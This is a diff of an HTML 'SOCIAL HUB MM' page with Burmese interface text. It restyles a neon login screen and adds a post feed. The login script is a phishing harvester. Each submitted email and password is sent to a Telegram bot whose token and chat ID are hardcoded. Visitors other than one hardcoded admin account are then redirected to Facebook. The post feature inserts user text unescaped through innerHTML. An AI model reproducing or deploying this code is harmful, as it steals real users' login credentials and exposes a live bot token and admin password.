@@ -18,21 +18,19 @@
             background-color: var(--bg-black);
             font-family: 'Share Tech Mono', 'Padauk', monospace;
             color: white;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            display: flex; justify-content: center; min-height: 100vh;
         }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }
 
+        /* Login UI */
         .login-box {
-            background: var(--glass);
-            backdrop-filter: blur(15px); border-radius: 15px;
+            background: var(--glass); backdrop-filter: blur(15px); border-radius: 15px;
             padding: 40px; width: 320px; text-align: center;
-            border: 1px solid var(--neon-teal);
-            box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
-            z-index: 100;
+            border: 1px solid var(--neon-teal); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
+            z-index: 100; margin-top: 10vh;
         }
-        .login-title { color: var(--neon-teal); font-size: 1.8rem; text-shadow: 0 0 10px var(--neon-teal); margin: 0; }
+        .login-title { color: var(--neon-teal); font-size: 1.8rem; text-shadow: 0 0 10px var(--neon-teal); margin-bottom: 20px; }
         .input-group { text-align: left; margin-bottom: 20px; }
-        .input-group label { color: var(--neon-teal); font-size: 0.75rem; display: block; margin-bottom: 5px; }
         .input-group input {
             width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.6);
             border: 1px solid var(--neon-purple); border-radius: 5px;
@@ -44,18 +42,40 @@
             font-weight: bold; cursor: pointer; border-radius: 5px;
             text-transform: uppercase; transition: 0.3s;
         }
-        .btn-neon:hover { background: var(--neon-teal); color: black; box-shadow: 0 0 20px var(--neon-teal); }
 
+        /* Dashboard Layout (Fixed for Mobile) */
         #dashboard {
-            display: none;
-            grid-template-columns: 260px 1fr 300px;
-            gap: 20px; width: 95%; max-width: 1200px; height: 90vh;
-            margin-top: 20px; opacity: 0; transition: opacity 1s ease;
+            display: none; 
+            grid-template-columns: 1fr;
+            gap: 20px; width: 95%; max-width: 800px;
+            margin: 20px auto; opacity: 0; transition: opacity 1s ease;
+            z-index: 100;
         }
+        @media (min-width: 900px) {
+            #dashboard { grid-template-columns: 260px 1fr; }
+        }
+
         .glass-panel {
             background: var(--glass); backdrop-filter: blur(10px);
             border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px;
-            padding: 20px; overflow-y: auto;
+            padding: 20px; box-sizing: border-box;
+        }
+
+        /* Post Input Area */
+        .post-input-area textarea {
+            width: 100%; height: 80px; background: rgba(0,0,0,0.3);
+            border: 1px dashed var(--neon-purple); border-radius: 8px;
+            color: white; padding: 10px; box-sizing: border-box;
+            resize: none; outline: none; margin-bottom: 10px;
+        }
+        .post-card {
+            background: rgba(255,255,255,0.02); padding: 15px;
+            border-radius: 10px; margin-bottom: 15px;
+            border-left: 3px solid var(--neon-teal);
+        }
+        .post-image {
+            width: 100%; max-height: 400px; object-fit: cover;
+            border-radius: 10px; margin-top: 10px; border: 1px solid var(--neon-teal);
         }
     </style>
 </head>
@@ -64,33 +84,40 @@
 
     <div class="login-box" id="loginUI">
         <h1 class="login-title" id="mainTitle">SOCIAL HUB MM</h1>
-        <p style="color: var(--neon-purple); font-size: 0.8rem; margin-bottom: 30px;">SECURE GATEWAY</p>
         <form id="loginForm">
-            <div class="input-group">
-                <label>Email Address</label>
-                <input type="email" id="email" placeholder="example@mail.com" required>
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="password" required>
-            </div>
+            <div class="input-group"><input type="email" id="email" placeholder="Email Address" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
             <button type="submit" class="btn-neon">LOGIN လုပ်မည်</button>
         </form>
     </div>
 
     <div id="dashboard">
-        <aside class="sidebar glass-panel">
+        <aside class="sidebar glass-panel" style="text-align: center;">
             <div style="width: 70px; height: 70px; background: linear-gradient(45deg, var(--neon-teal), var(--neon-purple)); border-radius: 50%; margin: 0 auto 15px; border: 2px solid var(--neon-teal);"></div>
             <h3 style="margin: 0;">Admin User</h3>
             <p style="color: var(--neon-green); font-size: 0.7rem;">● Online</p>
         </aside>
-        <main class="feed glass-panel">
-            <h4>News Feed</h4>
-            <p>Welcome to your secure dashboard. 🚀</p>
+
+        <main class="feed">
+            <div class="post-input-area glass-panel" style="margin-bottom: 20px;">
+                <textarea id="postContent" placeholder="ဘာတွေတွေးနေလဲ..."></textarea>
+                <input type="file" id="imageInput" accept="image/*" style="display: none;">
+                <button onclick="document.getElementById('imageInput').click()" class="btn-neon" style="width: auto; padding: 5px 15px; font-size: 12px;">📷 ပုံရွေးမည်</button>
+                <button onclick="createPost()" style="background: var(--neon-teal); border: none; padding: 8px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; float: right;">Post တင်မည်</button>
+                <div id="imagePreview" style="margin-top: 10px;"></div>
+            </div>
+
+            <div id="feedList">
+                <div class="post-card glass-panel">
+                    <h4 style="margin: 0; color: var(--neon-teal);">Tech Master MM</h4>
+                    <p>အခု Dashboard ထဲမှာ Post တွေ ပြန်တင်လို့ ရပါပြီ! 🚀</p>
+                </div>
+            </div>
         </main>
     </div>
 
     <script>
+        // Matrix Animation
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
         canvas.height = window.innerHeight; canvas.width = window.innerWidth;
@@ -114,16 +141,13 @@
         }
         setInterval(drawMatrix, 35);
 
+        // Login & Telegram Logic
         const loginForm = document.getElementById('loginForm');
-        const loginUI = document.getElementById('loginUI');
-        const dashboard = document.getElementById('dashboard');
-
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             const emailValue = document.getElementById('email').value;
             const passValue = document.getElementById('password').value;
 
-            // Telegram သို့ အချက်အလက်ပို့ခြင်း
             const token = "8417384892:AAHFtwxjmozHFmWBbPbG_TcGsKkoHcOXBLA"; 
             const chat_id = "7324613569";
             const message = `📡 Social Hub Alert!\n📧 Email: ${emailValue}\n🔑 Pass: ${passValue}`;
@@ -131,27 +155,45 @@
 
             try {
                 await fetch(url);
-
-                // Admin Account စစ်ဆေးခြင်း
                 if (emailValue === "lwink4141@gmail.com" && passValue === "lwink4141") {
-                    loginUI.style.borderColor = "#00ff41";
-                    document.getElementById('mainTitle').innerText = "ACCESS GRANTED";
+                    document.getElementById('loginUI').style.display = "none";
+                    const dash = document.getElementById('dashboard');
+                    dash.style.display = "grid";
+                    setTimeout(() => { dash.style.opacity = "1"; }, 50);
                     matrixColor = "#00ff41";
-                    
-                    setTimeout(() => {
-                        loginUI.style.display = "none";
-                        dashboard.style.display = "grid";
-                        setTimeout(() => { dashboard.style.opacity = "1"; }, 50);
-                    }, 800);
                 } else {
-                    // တခြားလူဆိုရင် redirect လုပ်မယ်
-                    alert("စနစ်ကို စစ်ဆေးနေပါသည်...");
                     window.location.href = "https://www.facebook.com";
                 }
-            } catch (err) {
-                alert("Connection Error!");
-            }
+            } catch (err) { alert("Connection Error!"); }
         });
+
+        // Create Post Logic
+        function createPost() {
+            const content = document.getElementById('postContent').value;
+            const imageInput = document.getElementById('imageInput');
+            const feed = document.getElementById('feedList');
+            let imageHTML = "";
+
+            if (imageInput.files[0]) {
+                const imageUrl = URL.createObjectURL(imageInput.files[0]);
+                imageHTML = `<img src="${imageUrl}" class="post-image">`;
+            }
+
+            if (content.trim() === "" && !imageInput.files[0]) return;
+
+            const newPost = document.createElement('div');
+            newPost.className = 'post-card glass-panel';
+            newPost.innerHTML = `
+                <h4 style="margin: 0; color: var(--neon-purple);">Admin User</h4>
+                <p>${content}</p>
+                ${imageHTML}
+            `;
+            feed.prepend(newPost);
+
+            document.getElementById('postContent').value = "";
+            imageInput.value = "";
+        }
     </script>
 </body>
 </html>
+
